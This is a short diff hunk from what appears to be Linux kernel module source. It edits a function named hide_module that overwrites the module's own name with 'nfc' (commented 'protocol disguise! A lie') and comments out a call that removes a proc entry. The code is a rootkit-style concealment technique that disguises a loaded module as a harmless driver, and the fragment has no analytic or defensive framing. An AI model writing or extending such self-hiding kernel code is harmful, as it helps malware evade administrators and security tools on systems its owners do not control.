@@ -627,7 +627,7 @@ void hide_module(void) {
 
     // protocol disguise! A lie
     memcpy(THIS_MODULE->name, "nfc\0", 4);
-     remove_proc_entry("protocols", net->proc_net);
+     //remove_proc_entry("protocols", net->proc_net);
 #endif
 }
 
